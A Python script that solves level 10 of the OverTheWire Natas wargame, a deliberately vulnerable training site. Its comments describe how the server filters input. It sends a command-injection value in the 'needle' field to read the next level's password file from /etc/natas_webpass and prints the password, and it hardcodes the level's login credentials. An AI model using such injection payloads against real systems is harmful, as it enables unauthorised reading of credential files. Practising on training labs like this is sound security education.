import requests
import  re


username = 'natas10'
password = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'
url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

# response = session.post(url, auth = (username, password))
# content = response.text
# print(content) #had an index-soruce.html


#The only thing preg_match is looking for is if it contains ; | &
# if(preg_match('/[;|&]/',$key)) {
#         print "Input contains an illegal character!";

##The same command injection used in the previous exploitation worked.
response = session.post(url, data ={"needle":". /etc/natas_webpass/natas11", "submit":"submit"}, auth = (username, password))
content = response.text
print(re.findall("natas11:(.*)",content)[0])



